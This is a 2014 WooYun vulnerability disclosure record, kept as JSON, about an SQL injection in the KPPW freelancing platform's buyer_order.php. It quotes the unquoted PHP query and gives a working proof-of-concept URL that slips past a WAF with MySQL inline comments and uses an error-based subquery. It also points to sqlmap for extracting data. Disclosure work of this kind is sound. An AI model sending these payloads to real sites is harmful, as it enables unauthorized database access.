{"id": 42303, "wybug_id": "wooyun-2014-086168", "wybug_title": "KPPW最新版SQL注入漏洞一", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-08 19:19", "wybug_open_date": "2015-03-08 19:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： KPPW最新版SQL注入一 详细说明：  KPPW最新版SQL注入一文件/control/gy/buyer_order.php\nswitch ($step) {......case 'step5':\t\tif($arrServiceOrderInfo['workfile']){\t\t\t$arrFileLists = db_factory::query('select file_name,save_name from '.TABLEPRE.'witkey_file where file_id in('.$arrServiceOrderInfo['workfile'].')');\t\t}\t\tif(isset($action)){\t\t\tswitch ($action) {\t\t\t\tcase 'acceptance':\t\t\t\t\t$objShop = new service_shop_class();\t\t\t\t\t$resText = $objShop->dispose_order ( $orderId, 'complete' );\t\t\t\t\tunset($objShop);\t\t\t\t\tif(true === $resText){\t\t\t\t\t\tkekezu::show_msg('订单处理完成，该订单已完成',$strUrl.\"&step=step6&orderId=\".$orderId,3,null,'ok');\t\t\t\t\t}else{\t\t\t\t\t\tkekezu::show_msg($resText,null,null,null,'fail');\t\t\t\t\t}\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\tkekezu::show_msg('访问页面不存在','index.php',3,null,'warning');\t\t\t\t\tbreak;\t\t\t}\t\t}\tbreak;\n注意看这里：\nif($arrServiceOrderInfo['workfile']){\t\t\t$arrFileLists = db_factory::query('select file_name,save_name from '.TABLEPRE.'witkey_file where file_id in('.$arrServiceOrderInfo['workfile'].')');\t\t}\n$arrServiceOrderInfo['workfile']直接进入SQL语句导致SQL注入这里怎么就是赤裸裸的注入啊   漏洞证明：  这里有waf，不过很简单，内联注释即可绕过了POC：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=gy&view=buyer_order&step=step5&arrServiceOrderInfo[workfile]=123) and 1=2 /*!50000union*/ select 1,2 from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b%23\n导致盲注看mysql执行日志：\n\n成功绕过，并执行看这条语句的执行结果：\n\n因为是盲注，显示不了数据，要跑数据的话，使用sqlmap既可以了。   修复方案：  变量$arrFileLists在这里没有用到啊，不知道是干啥的，删了吧或者加引号保护   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-09 11:50 厂商回复： 漏洞已修改              -QK 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}